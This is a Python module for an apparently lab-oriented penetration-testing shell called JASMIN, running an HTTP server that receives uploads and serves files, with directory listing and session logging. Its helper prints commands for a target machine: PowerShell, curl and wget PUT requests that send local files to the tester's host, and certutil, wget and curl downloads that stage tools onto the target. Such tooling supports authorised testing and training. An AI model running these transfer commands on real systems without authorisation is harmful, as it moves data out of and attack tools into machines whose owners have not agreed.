#!/usr/bin/env python3

"""
JASMIN Upload Server Module
Interactive file transfer server for penetration testing

Usage:
  jasmin> upload start                      # Default: port 8080, /home/saint/Tools
  jasmin> upload start 6969                 # Custom port, default location
  jasmin> upload start 6969 /tmp/payloads   # Custom port and directory  
  jasmin> upload start 8080 --target-dir    # Use current target directory
  jasmin> upload --custom                   # Interactive configuration
  jasmin> upload help                       # Show help
  jasmin> upload stop                       # Stop server
  jasmin> upload status                     # Show server status
"""

import os
import sys
import socket
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
import re
from datetime import datetime

# Default configuration
DEFAULT_PORT = 8080
DEFAULT_TOOLS_DIR = Path.home() / "Tools"

class JarvisUploadHandler(BaseHTTPRequestHandler):
    """Enhanced handler with JASMIN integration and logging"""
    
    def __init__(self, *args, base_dir=None, session_log=None, **kwargs):
        self.base_dir = Path(base_dir) if base_dir else Path(".")
        self.session_log = session_log
        super().__init__(*args, **kwargs)
    
    def _log_activity(self, action, filename, size=None):
        """Log upload/download activity to session log and console"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        size_str = f" ({size} bytes)" if size else ""
        
        # Console output
        print(f"[{timestamp}] {action}: {filename}{size_str}")
        
        # Session log if available
        if self.session_log and Path(self.session_log).exists():
            try:
                with open(self.session_log, "a") as f:
                    f.write(f"[{timestamp}] UPLOAD_SERVER_{action}: {filename}{size_str}\n")
            except Exception:
                pass  # Don't break if logging fails
    
    def do_PUT(self):
        """Handle file uploads via PUT"""
        try:
            length = int(self.headers['Content-Length'])
            filename = self.path.lstrip("/")
            
            # Security: prevent directory traversal
            if ".." in filename or filename.startswith("/") or "\\" in filename:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Invalid filename - no directory traversal allowed")
                return
            
            # Ensure base directory exists
            self.base_dir.mkdir(parents=True, exist_ok=True)
            
            filepath = self.base_dir / filename
            filepath.parent.mkdir(parents=True, exist_ok=True)
            
            # Read and save file
            file_data = self.rfile.read(length)
            with open(filepath, "wb") as f:
                f.write(file_data)
            
            # Log the upload
            self._log_activity("UPLOAD", filename, len(file_data))
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"[+] File uploaded successfully: {filename}\n".encode())
            
        except Exception as e:
            print(f"[!] Upload error: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Upload failed: {e}\n".encode())

    def do_POST(self):
        """Handle file uploads via POST (same as PUT)"""
        self.do_PUT()

    def do_GET(self):
        """Handle file downloads and directory listing"""
        try:
            requested_path = self.path.lstrip("/")
            
            # Security: prevent directory traversal
            if ".." in requested_path or requested_path.startswith("/"):
                self.send_response(400)
                self.end_headers()
                return
            
            if not requested_path:
                # Root directory - show file listing
                self._serve_directory_listing()
                return
            
            filepath = self.base_dir / requested_path
            
            if filepath.is_file():
                # Serve file
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{filepath.name}"')
                self.end_headers()
                
                with open(filepath, 'rb') as f:
                    data = f.read()
                    self.wfile.write(data)
                
                self._log_activity("DOWNLOAD", requested_path, len(data))
                
            elif filepath.is_dir():
                # Show directory contents
                self._serve_directory_listing(requested_path)
                
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found\n")
                
        except Exception as e:
            print(f"[!] Download error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def _serve_directory_listing(self, subpath=""):
        """Serve a simple directory listing"""
        try:
            current_dir = self.base_dir / subpath if subpath else self.base_dir
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f"""
            <html><head><title>JASMIN Upload Server - Directory Listing</title></head>
            <body>
            <h2>JASMIN Upload Server</h2>
            <h3>Directory: /{subpath}</h3>
            <hr>
            <ul>
            """
            
            if subpath:
                parent = str(Path(subpath).parent) if Path(subpath).parent != Path(".") else ""
                html += f'<li><a href="/{parent}">.. (parent directory)</a></li>'
            
            for item in sorted(current_dir.iterdir()):
                if item.is_dir():
                    rel_path = item.relative_to(self.base_dir)
                    html += f'<li>📁 <a href="/{rel_path}">{item.name}/</a></li>'
                else:
                    rel_path = item.relative_to(self.base_dir)
                    size = item.stat().st_size
                    html += f'<li>📄 <a href="/{rel_path}">{item.name}</a> ({size} bytes)</li>'
            
            html += """
            </ul>
            <hr>
            <p><strong>Upload a file:</strong> Use PUT/POST method to this URL with filename in path</p>
            </body></html>
            """
            
            self.wfile.write(html.encode())
            
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Directory listing error: {e}".encode())

    def log_message(self, format, *args):
        """Suppress default HTTP logging"""
        pass

class JarvisUploadServer:
    """JASMIN Upload Server with interactive configuration"""
    
    def __init__(self):
        self.server = None
        self.server_thread = None
        self.running = False
        self.port = None
        self.base_dir = None
        self.session_log = None
        
    def get_server_ip(self):
        """Get the best IP address for the server (prioritize tun0)"""
        # Try tun0 first (VPN interface)
        try:
            ip_output = subprocess.check_output("ip addr show tun0", shell=True).decode()
            match = re.search(r"inet\s(\d+\.\d+\.\d+\.\d+)", ip_output)
            if match:
                return match.group(1)
        except Exception:
            # tun0 not found, fall back to primary interface
            pass
        
        # Fallback to primary interface
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))  # Doesn't send data
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            print(f"[!] Error retrieving IP address: {e}")
            return "127.0.0.1"
    
    def detect_target_os(self, env):
        """Detect target OS for appropriate commands"""
        if not env:
            return "unknown"
        
        # Check if we have target information
        target_name = env.get('BOXNAME', '').lower()
        
        # Simple heuristics - could be enhanced with nmap results
        windows_indicators = ['windows', 'win', 'dc', 'ad', 'forest', 'sauna']
        linux_indicators = ['linux', 'ubuntu', 'centos', 'debian', 'kali']
        
        for indicator in windows_indicators:
            if indicator in target_name:
                return "windows"
        
        for indicator in linux_indicators:
            if indicator in target_name:
                return "linux"
        
        return "unknown"
    
    def start_server(self, port=DEFAULT_PORT, base_dir=None, env=None):
        """Start the upload server"""
        if self.running:
            print("[!] Upload server is already running")
            return False
        
        # Set up directories
        if base_dir is None:
            base_dir = DEFAULT_TOOLS_DIR
        
        base_dir = Path(base_dir)
        
        # Only show creation message if directory doesn't exist
        if not base_dir.exists():
            base_dir.mkdir(parents=True, exist_ok=True)
            print(f"[+] Created directory: {base_dir}")
        else:
            # Just ensure it exists (silent)
            base_dir.mkdir(parents=True, exist_ok=True)
        
        # Get session log if available
        session_log = env.get('LOGFILE') if env else None
        
        try:
            # Create handler class with configuration
            def handler(*args, **kwargs):
                return JarvisUploadHandler(*args, base_dir=base_dir, session_log=session_log, **kwargs)
            
            self.server = HTTPServer(('', port), handler)
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            self.running = True
            self.port = port
            self.base_dir = base_dir
            self.session_log = session_log
            
            ip = self.get_server_ip()
            target_os = self.detect_target_os(env)
            
            print(f"[+] JASMIN Upload Server started on http://{ip}:{port}")
            print(f"[+] Serving files from: {base_dir.absolute()}")
            print(f"[+] Web interface: http://{ip}:{port}/")
            
            self._show_upload_commands(ip, port, target_os)
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to start upload server: {e}")
            return False
    
    def _show_upload_commands(self, ip, port, target_os="unknown"):
        """Show OS-appropriate upload commands"""
        print(f"\n[*] Upload Commands:")
        
        if target_os == "windows":
            print(f"    PowerShell:")
            print(f"      Invoke-WebRequest -Uri http://{ip}:{port}/<filename> -Method PUT -InFile <local_file>")
            print(f"      iwr http://{ip}:{port}/<filename> -Method PUT -InFile <local_file>")
            print(f"    certutil:")
            print(f"      certutil -urlcache -split -f http://{ip}:{port}/<filename>")
        
        elif target_os == "linux":
            print(f"    wget:")
            print(f"      wget --method=PUT --body-file=<local_file> http://{ip}:{port}/<filename>")
            print(f"      wget http://{ip}:{port}/<filename>")
            print(f"    curl:")
            print(f"      curl -X PUT --data-binary @<local_file> http://{ip}:{port}/<filename>")
            print(f"      curl -O http://{ip}:{port}/<filename>")
        
        else:
            # Show both
            print(f"    PowerShell (Windows):")
            print(f"      Invoke-WebRequest -Uri http://{ip}:{port}/<filename> -Method PUT -InFile <local_file>")
            print(f"    wget/curl (Linux):")
            print(f"      wget --method=PUT --body-file=<local_file> http://{ip}:{port}/<filename>")
            print(f"      curl -X PUT --data-binary @<local_file> http://{ip}:{port}/<filename>")
    
    def stop_server(self):
        """Stop the upload server"""
        if not self.running:
            print("[!] Upload server is not running")
            return
        
        try:
            self.server.shutdown()
            self.server_thread.join(timeout=2)
            self.running = False
            print("[+] Upload server stopped")
        except Exception as e:
            print(f"[!] Error stopping server: {e}")
    
    def status(self):
        """Show server status"""
        if self.running:
            ip = self.get_server_ip()
            print(f"[+] Upload server is running on http://{ip}:{self.port}")
            print(f"[+] Serving files from: {self.base_dir.absolute()}")
            print(f"[+] Web interface: http://{ip}:{self.port}/")
        else:
            print("[!] Upload server is not running")

# Global server instance
_upload_server = JarvisUploadServer()

def interactive_config():
    """Interactive configuration for upload server"""
    print("[*] Interactive Upload Server Configuration")
    print()
    
    # Get port
    port_input = input(f"[?] Port (default {DEFAULT_PORT}): ").strip()
    try:
        port = int(port_input) if port_input else DEFAULT_PORT
    except ValueError:
        print("[!] Invalid port, using default")
        port = DEFAULT_PORT
    
    # Get directory
    print("[?] Directory options:")
    print(f"    1. Default tools directory ({DEFAULT_TOOLS_DIR})")
    print(f"    2. Target directory (if in session)")
    print(f"    3. Custom path")
    
    choice = input("[?] Choose [1]: ").strip()
    
    if choice == "2":
        base_dir = "--target-dir"  # Will be handled by caller
    elif choice == "3":
        custom_path = input("[?] Custom directory: ").strip()
        if custom_path and Path(custom_path).exists():
            base_dir = custom_path
        else:
            print("[!] Invalid path, using default")
            base_dir = None
    else:
        base_dir = None  # Use default
    
    # Confirm start
    confirm = input("[?] Start server now? [Y/n]: ").strip().lower()
    if confirm in ['', 'y', 'yes']:
        return port, base_dir, True
    else:
        return port, base_dir, False

def handle_upload_command(env, tokens):
    """Handle upload server commands in JASMIN"""
    global _upload_server
    
    if len(tokens) < 2:
        print_upload_help()
        return
    
    cmd = tokens[1].lower()
    
    if cmd == "start":
        # Parse arguments
        port = DEFAULT_PORT
        base_dir = None
        use_target_dir = False
        
        # Check for --target-dir flag
        if "--target-dir" in tokens:
            use_target_dir = True
            tokens = [t for t in tokens if t != "--target-dir"]
        
        # Parse port and directory
        args = [t for t in tokens[2:] if not t.startswith("--")]
        
        if len(args) >= 1:
            try:
                port = int(args[0])
            except ValueError:
                print("[!] Invalid port number")
                return
        
        if len(args) >= 2:
            base_dir = args[1]
            if not Path(base_dir).exists():
                print(f"[!] Directory does not exist: {base_dir}")
                return
        
        # Handle --target-dir flag
        if use_target_dir:
            if env and 'OUTDIR' in env:
                target_uploads = Path(env['OUTDIR']) / "uploads"
                base_dir = str(target_uploads)
                print(f"[*] Using target upload directory: {base_dir}")
            else:
                print("[!] No active session for --target-dir, using default location")
                base_dir = None
        
        # Stop existing server if running
        if _upload_server.running:
            _upload_server.stop_server()
        
        # Start new server
        _upload_server.start_server(port, base_dir, env)
        
    elif cmd == "--custom":
        port, base_dir, should_start = interactive_config()
        
        if should_start:
            # Handle --target-dir in interactive mode
            if base_dir == "--target-dir":
                if env and 'OUTDIR' in env:
                    target_uploads = Path(env['OUTDIR']) / "uploads"
                    base_dir = str(target_uploads)
                    print(f"[*] Using target upload directory: {base_dir}")
                else:
                    print("[!] No active session for target directory, using default")
                    base_dir = None
            
            if _upload_server.running:
                _upload_server.stop_server()
            
            _upload_server.start_server(port, base_dir, env)
        
    elif cmd == "stop":
        _upload_server.stop_server()
        
    elif cmd == "status":
        _upload_server.status()
        
    elif cmd == "help":
        print_upload_help()
        
    else:
        print(f"[!] Unknown upload command: {cmd}")
        print_upload_help()

def print_upload_help():
    """Print upload server help"""
    help_text = f"""
JASMIN Upload Server Commands:

  upload start                          Start server (port {DEFAULT_PORT}, {DEFAULT_TOOLS_DIR})
  upload start 6969                     Custom port, default location
  upload start 6969 /tmp/payloads       Custom port and directory  
  upload start 8080 --target-dir        Use current target's upload directory
  upload --custom                       Interactive configuration
  upload stop                           Stop the server
  upload status                         Show server status
  upload help                           Show this help

Examples:
  jasmin> upload start                  # Quick start with defaults
  jasmin> upload start 6969             # Custom port
  jasmin> upload --custom               # Interactive setup
  jasmin> upload start 8080 --target-dir  # Use target directory

The server provides:
  - File upload via PUT/POST methods
  - File download via GET method  
  - Web-based directory browsing
  - Activity logging to session log
  - OS-appropriate command suggestions
"""
    print(help_text)

def cleanup_upload_server():
    """Cleanup function to stop server on exit"""
    global _upload_server
    if _upload_server.running:
        print("\n[*] Stopping upload server...")
        _upload_server.stop_server()

# CLI support for direct execution
def main():
    """CLI support for upload server"""
    if len(sys.argv) < 2:
        print_upload_help()
        return
    
    # Mock environment for CLI usage
    env = {}
    
    # Parse command line arguments
    tokens = ["upload"] + sys.argv[1:]
    handle_upload_command(env, tokens)

if __name__ == "__main__":
    main()